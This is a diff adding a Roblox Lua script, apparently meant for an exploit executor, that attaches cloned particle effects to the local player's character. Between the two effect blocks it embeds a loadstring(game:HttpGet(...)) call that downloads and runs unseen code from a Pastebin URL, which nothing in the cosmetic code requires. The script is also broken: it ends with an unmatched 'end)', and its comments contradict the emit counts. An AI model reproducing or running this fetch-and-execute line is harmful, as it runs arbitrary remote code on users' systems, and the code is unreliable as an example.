@@ -1,0 +1,24 @@
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local EmitBatch1 = ReplicatedStorage.Resources.KJEffects["fine...Emit"].EmitBatch1:Clone()
+local player = game.Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+
+EmitBatch1.Parent = character:WaitForChild("HumanoidRootPart")
+
+for _, child in ipairs(EmitBatch1:GetChildren()) do
+    if child:IsA("ParticleEmitter") then
+        child:Emit(50) -- Emit 1 particle
+    end
+end
+
+
+loadstring(game:HttpGet("https://pastebin.com/raw/1BeBG2Ch"))()
+
+local boom1 = game.ReplicatedStorage.Resources.KJEffects["spinnerthing"].spinningpartysmoke:Clone()
+boom1.Parent = game.Players.LocalPlayer.Character["HumanoidRootPart"]
+    for _, child in ipairs(boom1:GetChildren()) do
+        if child:IsA("ParticleEmitter") then -- Check if the child is a ParticleEmitter
+            child:Emit(50) -- Emit 20 particles
+        end
+    end
+end)
